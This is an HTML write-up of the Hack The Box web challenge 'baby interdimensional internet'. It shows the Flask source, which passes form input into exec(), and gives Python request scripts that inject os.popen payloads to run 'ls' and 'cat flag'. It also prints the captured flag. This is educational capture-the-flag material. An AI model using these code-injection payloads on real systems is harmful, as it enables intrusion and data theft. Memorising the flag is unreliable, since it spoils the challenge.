@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Baby interdimensional internet</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav>
+            <ul class="nav-menu nav-center">
+            <li><a href="https://github.com/s-3ntinel"><img src="/github_logo.png" /></a></li>
+            <li><a href="#">CTFs <i class="arrow down"></i></a>
+                <ul>
+                <li><a href="#">FwordCTF_2020 <i class="arrow right"></i></a>
+                    <ul>
+                    <li><a href="#">bash <i class="arrow right"></i></a>
+                        <ul>
+                        <li><a href="/ctfs/fword_ctf2020/bash/bash_is_fun.html">bash is fun</a></li>
+                        <li><a href="/ctfs/fword_ctf2020/bash/jail_boss.html">jail boss</a></li>
+                        </ul>
+                    </li>
+                    </ul>
+                </li>
+                </ul>
+            </li>
+            <li><a href="#">Hach the box <i class="arrow down"></i></a>
+                <ul>
+                <li><a href="#">Challenges <i class="arrow right"></i></a>
+                    <ul>
+                    <li><a href="#">Web <i class="arrow right"></i></a>
+                        <ul>
+                        <li><a href="/hackthebox\challenges\web\baby_interdimensional_internet\baby_interdimensional_internet.html">Baby interdimensional internet</a></li>
+                        </ul>
+                    </li>
+                    </ul>
+                </li>
+                </ul>
+            </li>
+            </ul>
+        </nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="baby_interdimensional_internet_0"></a>baby interdimensional internet</h1>
+    <h2 class="code-line" data-line-start=1 data-line-end=2><a id="Challenge_description_1"></a>Challenge description</h2>
+    <p class="has-line-data" data-line-start="2" data-line-end="3">aw man, aw geez, my grandpa rick is passed out from all the drinking again, where is a calculator when you need one, aw geez</p>
+    <h2 class="code-line" data-line-start=4 data-line-end=5><a id="Looking_around_4"></a>Looking around</h2>
+    <p class="has-line-data" data-line-start="5" data-line-end="6">When we visit the website in a browser, we see this.</p>
+    <p class="has-line-data" data-line-start="7" data-line-end="8"><img src="./site.PNG" alt="website"></p>
+    <p class="has-line-data" data-line-start="9" data-line-end="10">There is a number that seems to change everytime we refresh the page. First thing we are going to do is look at the source.</p>
+    <p class="has-line-data" data-line-start="11" data-line-end="12"><img src="./source.PNG" alt="website source"></p>
+    <p class="has-line-data" data-line-start="13" data-line-end="14">We can see there is a hint for a <code>/debug</code> page where we find the source for the challenge.</p>
+    <h2 class="code-line" data-line-start=15 data-line-end=16><a id="Challenge_source_code_15"></a>Challenge source code</h2>
+    <pre><code class="has-line-data" data-line-start="18" data-line-end="61" class="language-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response, request, render_template, request
+    <span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice, randint
+    <span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> lowercase
+    <span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps
+    
+    app = Flask(__name__)
+    
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc</span><span class="hljs-params">(recipe)</span>:</span>
+        <span class="hljs-keyword">global</span> garage
+        garage = {}
+        <span class="hljs-keyword">try</span>: exec(recipe, garage)
+        <span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span>
+    
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GCR</span><span class="hljs-params">(func)</span>:</span> <span class="hljs-comment"># Great Calculator of the observable universe and it's infinite timelines</span>
+    <span class="hljs-decorator">    @wraps(func)</span>
+        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">federation</span><span class="hljs-params">(*args, **kwargs)</span>:</span>
+            ingredient = <span class="hljs-string">''</span>.join(choice(lowercase) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>))
+            recipe = <span class="hljs-string">'%s = %s'</span> % (ingredient, <span class="hljs-string">''</span>.join(map(str, [randint(<span class="hljs-number">1</span>, <span class="hljs-number">69</span>), choice([<span class="hljs-string">'+'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">'*'</span>]), randint(<span class="hljs-number">1</span>,<span class="hljs-number">69</span>)])))
+    
+            <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:
+                ingredient = request.form.get(<span class="hljs-string">'ingredient'</span>, <span class="hljs-string">''</span>)
+                recipe = <span class="hljs-string">'%s = %s'</span> % (ingredient, request.form.get(<span class="hljs-string">'measurements'</span>, <span class="hljs-string">''</span>))
+    
+            calc(recipe)
+    
+            <span class="hljs-keyword">if</span> garage.get(ingredient, <span class="hljs-string">''</span>):
+                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, calculations=garage[ingredient])
+    
+            <span class="hljs-keyword">return</span> func(*args, **kwargs)
+        <span class="hljs-keyword">return</span> federation
+    
+    <span class="hljs-decorator">@app.route('/', methods=['GET', 'POST'])</span>
+    <span class="hljs-decorator">@GCR</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
+    
+    <span class="hljs-decorator">@app.route('/debug')</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
+        <span class="hljs-keyword">return</span> Response(open(__file__).read(), mimetype=<span class="hljs-string">'text/plain'</span>)
+    
+    <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+        app.run(<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">1337</span>)
+    </code></pre>
+    <h2 class="code-line" data-line-start=62 data-line-end=63><a id="Methodology_62"></a>Methodology</h2>
+    <p class="has-line-data" data-line-start="64" data-line-end="65">Here we see a very simple <code>flask</code> webapp. We see we can perform a <code>GET</code> and <code>POST</code> request on <code>/</code> endpoint and <code>GET</code> on <code>/debug</code>. When we perform a <code>POST</code> on <code>/</code> we eventually hit this part of the code.</p>
+    <pre><code class="has-line-data" data-line-start="67" data-line-end="71" class="language-python"><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:
+        ingredient = request.form.get(<span class="hljs-string">'ingredient'</span>, <span class="hljs-string">''</span>)
+        recipe = <span class="hljs-string">'%s = %s'</span> % (ingredient, request.form.get(<span class="hljs-string">'measurements'</span>, <span class="hljs-string">''</span>))
+    </code></pre>
+    <p class="has-line-data" data-line-start="72" data-line-end="73">In this part of the code we can influence how to <code>recipe</code> string is going to look like. This string is later going to be used as a parameter for method <code>calc()</code>.</p>
+    <pre><code class="has-line-data" data-line-start="75" data-line-end="77" class="language-python">calc(recipe)
+    </code></pre>
+    <p class="has-line-data" data-line-start="78" data-line-end="79">This method provides an attack vector that we are going to exploit.</p>
+    <pre><code class="has-line-data" data-line-start="81" data-line-end="87" class="language-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc</span><span class="hljs-params">(recipe)</span>:</span>
+        <span class="hljs-keyword">global</span> garage
+        garage = {}
+        <span class="hljs-keyword">try</span>: exec(recipe, garage)
+        <span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span>
+    </code></pre>
+    <p class="has-line-data" data-line-start="88" data-line-end="89">This is a very simple exploit. Here we can see, method <code>exec()</code> directly executes python code that we provided in <code>recipe</code> variable. This is going to win us a challenge.</p>
+    <h2 class="code-line" data-line-start=90 data-line-end=91><a id="Standard_behaviour_90"></a>Standard behaviour</h2>
+    <p class="has-line-data" data-line-start="91" data-line-end="92">When we visit the page we are implicitly using the <code>GET</code> request on <code>/</code>. Therefore we don’t visit the if branch with the <code>POST</code> but we visit this part of the code.</p>
+    <pre><code class="has-line-data" data-line-start="94" data-line-end="98" class="language-python">ingredient = <span class="hljs-string">''</span>.join(choice(lowercase) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>))
+    
+    recipe = <span class="hljs-string">'%s = %s'</span> % (ingredient, <span class="hljs-string">''</span>.join(map(str, [randint(<span class="hljs-number">1</span>, <span class="hljs-number">69</span>), choice([<span class="hljs-string">'+'</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">'*'</span>]), randint(<span class="hljs-number">1</span>,<span class="hljs-number">69</span>)])))
+    </code></pre>
+    <p class="has-line-data" data-line-start="99" data-line-end="100">Here <code>recipe</code> is assembled automatically using random values. Example.</p>
+    <pre><code class="has-line-data" data-line-start="102" data-line-end="104" class="language-python"><span class="hljs-string">'zurkssxoqj = 38-65'</span>
+    </code></pre>
+    <p class="has-line-data" data-line-start="105" data-line-end="106">This gets sent to the <code>calc()</code> method. Here the <code>exec()</code> would look like this.</p>
+    <pre><code class="has-line-data" data-line-start="108" data-line-end="110" class="language-python"><span class="hljs-keyword">try</span>: exec(<span class="hljs-string">'zurkssxoqj = 38-65'</span>, garage)
+    </code></pre>
+    <p class="has-line-data" data-line-start="111" data-line-end="112">This gets executed internally and we can see there is a <code>garage</code> parameter which is a global variable therefore accessable in the whole script. <code>garage</code> is a dictionary that holds all the references to variables in the executed context. In our case, it would hold an item (beside other implicit values).</p>
+    <pre><code class="has-line-data" data-line-start="114" data-line-end="116" class="language-python">{<span class="hljs-string">'zurkssxoqj'</span> = -<span class="hljs-number">27</span>}
+    </code></pre>
+    <p class="has-line-data" data-line-start="117" data-line-end="118">Back to the <code>federation()</code> method.</p>
+    <pre><code class="has-line-data" data-line-start="120" data-line-end="123" class="language-python"><span class="hljs-keyword">if</span> garage.get(ingredient, <span class="hljs-string">''</span>):
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, calculations=garage[ingredient])
+    </code></pre>
+    <p class="has-line-data" data-line-start="124" data-line-end="125">Here we extract the value from the <code>ingredient</code> variable and send it to the template to be rendered as the number we see on the screen. After the substitution the code would look like this.</p>
+    <pre><code class="has-line-data" data-line-start="127" data-line-end="130" class="language-python"><span class="hljs-keyword">if</span> garage.get(<span class="hljs-string">'zurkssxoqj'</span>, <span class="hljs-string">''</span>):
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, calculations=garage[<span class="hljs-string">'zurkssxoqj'</span>])
+    </code></pre>
+    <h2 class="code-line" data-line-start=131 data-line-end=132><a id="Exploit_131"></a>Exploit</h2>
+    <p class="has-line-data" data-line-start="132" data-line-end="133">We can send a <code>POST</code> request to craft our own recipe. When we do that we are accessing this part of the code.</p>
+    <pre><code class="has-line-data" data-line-start="135" data-line-end="139" class="language-python"><span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:
+        ingredient = request.form.get(<span class="hljs-string">'ingredient'</span>, <span class="hljs-string">''</span>)
+        recipe = <span class="hljs-string">'%s = %s'</span> % (ingredient, request.form.get(<span class="hljs-string">'measurements'</span>, <span class="hljs-string">''</span>))
+    </code></pre>
+    <p class="has-line-data" data-line-start="140" data-line-end="141">From above we can see, that the webapp extracts values of variables <code>ingredient</code> and <code>measurements</code> from request body. We can try to send a POST request containing those variables in the body, and potentialy assemble our malicious <code>recipe</code>.</p>
+    <p class="has-line-data" data-line-start="142" data-line-end="143">As an example we can start lightly to confirm we can control the <code>recipe</code>. An example <code>POST</code> body would look like this.</p>
+    <pre><code class="has-line-data" data-line-start="145" data-line-end="150" class="language-json">{
+        "<span class="hljs-attribute">ingredient</span>": <span class="hljs-value"><span class="hljs-string">"our_var"</span></span>,
+        "<span class="hljs-attribute">measurements</span>": <span class="hljs-value"><span class="hljs-string">"1337"</span>
+    </span>}
+    </code></pre>
+    <p class="has-line-data" data-line-start="151" data-line-end="152">The <code>recipe</code> would look like this.</p>
+    <pre><code class="has-line-data" data-line-start="154" data-line-end="156" class="language-python"><span class="hljs-string">'our_var = 1337'</span>
+    </code></pre>
+    <p class="has-line-data" data-line-start="157" data-line-end="158">We are going to use python <code>requests</code> module to send our request.</p>
+    <pre><code class="has-line-data" data-line-start="160" data-line-end="170" class="language-python"><span class="hljs-comment">#!/usr/bin/python3 </span>
+    
+    <span class="hljs-keyword">import</span> requests 
+    
+    data = {<span class="hljs-string">'ingredient'</span>: <span class="hljs-string">'our_var'</span>, <span class="hljs-string">'measurements'</span>: <span class="hljs-string">'1337'</span>}
+    addr = <span class="hljs-string">'http://&lt;ip&gt;:&lt;port&gt;'</span>
+    r = requests.post(addr, data=data)
+    
+    print(r.content)
+    </code></pre>
+    <p class="has-line-data" data-line-start="171" data-line-end="172">In the response we see our number 1337, meaning we can successfully control the <code>exec()</code> statement.</p>
+    <pre><code class="has-line-data" data-line-start="174" data-line-end="176">&lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'&gt; 1337 &lt;/h1&gt;
+    </code></pre>
+    <p class="has-line-data" data-line-start="177" data-line-end="178">As for the exploit, we can import the <code>os</code> module and have <code>RCE</code> on the server.</p>
+    <pre><code class="has-line-data" data-line-start="180" data-line-end="190" class="language-python"><span class="hljs-comment">#!/usr/bin/python3 </span>
+    
+    <span class="hljs-keyword">import</span> requests 
+    
+    data = {<span class="hljs-string">'ingredient'</span>: <span class="hljs-string">'our_var'</span>, <span class="hljs-string">'measurements'</span>: <span class="hljs-string">'__import__("os").popen("ls").read()'</span>}
+    addr = <span class="hljs-string">'http://&lt;ip&gt;:&lt;port&gt;'</span>
+    r = requests.post(addr, data=data)
+    
+    print(r.content)
+    </code></pre>
+    <p class="has-line-data" data-line-start="191" data-line-end="192">The <code>exec</code> would look like this.</p>
+    <pre><code class="has-line-data" data-line-start="194" data-line-end="196" class="language-python"><span class="hljs-keyword">try</span>: exec(<span class="hljs-string">'our_var = __import__("os").popen("ls").read()'</span>, garage)
+    </code></pre>
+    <p class="has-line-data" data-line-start="197" data-line-end="198">We are going to list the items in webapp <code>cwd</code>.</p>
+    <pre><code class="has-line-data" data-line-start="200" data-line-end="202">&lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'&gt; app.py\nflag\ntemplates\n &lt;/h1&gt;
+    </code></pre>
+    <p class="has-line-data" data-line-start="203" data-line-end="204">We see there is a file named flag which contains the challenge secret.</p>
+    <h2 class="code-line" data-line-start=205 data-line-end=206><a id="Final_exploit_code_205"></a>Final exploit code</h2>
+    <pre><code class="has-line-data" data-line-start="208" data-line-end="218" class="language-python"><span class="hljs-comment">#!/usr/bin/python3 </span>
+    
+    <span class="hljs-keyword">import</span> requests 
+    
+    data = {<span class="hljs-string">'ingredient'</span>: <span class="hljs-string">'our_var'</span>, <span class="hljs-string">'measurements'</span>: <span class="hljs-string">'__import__("os").popen("cat flag").read()'</span>}
+    addr = <span class="hljs-string">'http://&lt;ip&gt;:&lt;port&gt;'</span>
+    r = requests.post(addr, data=data)
+    
+    print(r.content)
+    </code></pre>
+    <pre><code class="has-line-data" data-line-start="220" data-line-end="222">&lt;h1 style='font-size: 140px; text-shadow: 2px 2px 0 #0C3447, 5px 5px 0 #6a1b9a, 10px 10px 0 #00131E;'&gt; HTB{n3v3r_trust1ng_us3r_1nput_ag41n_1n_my_l1f3} &lt;/h1&gt;
+    </code></pre>
+    <h2 class="code-line" data-line-start=223 data-line-end=224><a id="Flag_223"></a>Flag</h2>
+    <p class="has-line-data" data-line-start="224" data-line-end="225"><strong>HTB{n3v3r_trust1ng_us3r_1nput_ag41n_1n_my_l1f3}</strong></p>
+
+</body>
+</html>
